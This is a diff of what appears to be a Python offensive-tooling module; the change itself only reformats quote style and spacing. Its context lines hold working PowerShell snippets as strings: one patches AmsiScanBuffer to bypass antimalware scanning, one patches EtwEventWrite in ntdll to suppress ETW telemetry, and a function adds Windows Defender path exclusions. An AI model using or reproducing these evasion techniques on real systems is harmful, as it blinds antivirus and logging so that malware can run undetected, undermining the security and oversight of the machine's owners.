@@ -33,8 +33,8 @@ _AMSI_PATCHES: dict[str, str] = {
     "com_bypass": (
         "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
         "public class Bypass{"
-        "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);"
-        "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);"
+        '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
+        '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);'
         "}';"
         "$h=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::Load('System.Management.Automation'));"
         "$addr=[Bypass]::GetProcAddress($h,'AmsiScanBuffer');"
@@ -56,14 +56,15 @@ def amsi_bypass(technique: str = "reflection") -> str:
 
 # ── ETW ──────────────────────────────────────────────────────────────────────
 
+
 def etw_bypass() -> str:
     """Return a PowerShell snippet that patches EtwEventWrite to suppress ETW telemetry."""
     return (
         "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
         "public class ETW{"
-        "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);"
-        "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);"
-        "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);"
+        '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
+        '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'
+        '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint op);'
         "}';"
         "$lib=[ETW]::LoadLibrary('ntdll.dll');"
         "$addr=[ETW]::GetProcAddress($lib,'EtwEventWrite');"
@@ -74,6 +75,7 @@ def etw_bypass() -> str:
 
 
 # ── Windows Defender ─────────────────────────────────────────────────────────
+
 
 def defender_exclusion_command(path: str) -> str:
     """Return a PowerShell command to add a Defender path exclusion (requires admin)."""
